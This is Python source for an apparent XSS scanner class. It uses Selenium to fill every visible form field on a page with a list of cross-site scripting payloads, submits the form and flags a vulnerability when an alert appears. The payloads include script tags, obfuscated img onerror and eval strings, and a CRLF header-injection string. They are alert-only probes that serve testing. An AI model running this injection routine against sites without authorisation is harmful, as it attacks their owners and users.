from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import gevent
import traceback
from driver import getDriver

class XSS_Scanner():
    def __init__(self, page, app) -> None:
        try : 
            self.payloads = ["<img src=x onerror=eval(atob('YWxlcnQoMSk='))>","<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
                    "<script>alert(1)</script>","<svg onload=alert('1')>","<img src=x onerror=alert('1') style='display:none'>", 
                    "<a data-alert='1' onclick=eval(atob('YWxlcnQoJ2RhdGEtYWxlcnQnKQ=='))>XSS1234</a>",
                    "<div><script>alert(String.fromCharCode(66, 82, 79, 87, 78))</script></div>","<iframe srcdoc='<script>alert(`1`)</script>'></iframe>","%0D%0AContent-Type: text/html%0D%0A%3Cscript%3Ealert(1)%3C/script%3E"]
            self.threadsEnCours = False
            self.page =page
            self.threads = []
            self.vulnFound=None
            self.vitesse = 4
            self.startScan(app)
        except :
            app.webScanner.error.append("Due to a serious error the search could not be executed. Please contact support."+traceback.format_exc())
            return

    def getVulnFound(self):
        return self.vulnFound

    def startScan(self,app):
        try :
            if self.vitesse == 1:
                sous_liste = [self.payloads]
            else:
                taille_sous_liste = len(self.payloads) // self.vitesse
                reste = len(self.payloads) % self.vitesse
                sous_liste = []
                debut = 0
                for i in range(self.vitesse):
                    fin = debut + taille_sous_liste
                    if i < reste:
                        fin += 1 
                    sous_liste.append(self.payloads[debut:fin])
                    debut = fin
        except:
            app.webScanner.error.append("Critical error cuttting payloads XSS"+traceback.format_exc())
            return
          
        groupesPayload=[]
        for groupe in sous_liste:
            if not(groupe == [] or groupe == None or groupe == "" or groupe == [ ]):
                groupesPayload.append(groupe)
        self.threadsEnCours = True
        try:
            threads = [gevent.spawn(self.check_xss_form, self.page, groupesPayload[i],app) for i in range(len(groupesPayload))]
            gevent.joinall(threads)
        except:
            app.webScanner.error.append("Critical error multi threading !!! Please contact support."+traceback.format_exc())
        print("ending xss scan")


    def check_xss_form(self,page=None, payloads=[],app=None):
        try : 
            #phân tích lỗ hổng xss trong các biểu mẫu
            driver = getDriver(app)
            if driver == None : 
                app.webScanner.error.append("The browser driver dont work or does not exist. XSS analysis failed. Please check your software settings and or configurations."+traceback.format_exc())
                return
            for payload in payloads: 
                if self.threadsEnCours :
                    driver.get(page)
                    WebDriverWait(driver, 10).until(lambda driver: driver.execute_script('return document.readyState') == 'complete')
                    try : 
                        fields = driver.find_elements(By.XPATH, "//input | //textarea")
                    except: 
                        return
                    for field in fields:
                        try : 
                            if field.is_displayed():
                                field.send_keys(str(payload))
                        except :
                            driver.quit()
                            return
                    try :
                        submit_button = driver.find_element(By.XPATH, "//input[@type='submit']")
                        submit_button.click()
                    except :
                        driver.quit()
                        return
                    alert_text="No alert"
                    if self.threadsEnCours == False :
                        driver.quit()
                        return
                    try : 
                        alert=WebDriverWait(driver, 1).until(EC.alert_is_present())
                        alert_text = alert.text
                        alert.accept()
                    except :
                        print("XSS payload failed :", payload)
                    if "1" in str(alert_text) or "BROWN" in str(alert_text) :
                        self.threadsEnCours = False
                        self.vulnFound="⚠ Possible XSS vulnerability on : " + str(page) + " with : "+payload+ "\n"
                        driver.quit()
                        return
                else :
                    driver.quit()
                    return
            return
        except :
            app.webScanner.error.append("Error while searching for XSS vulnerability "+traceback.format_exc())
            driver.quit()
            return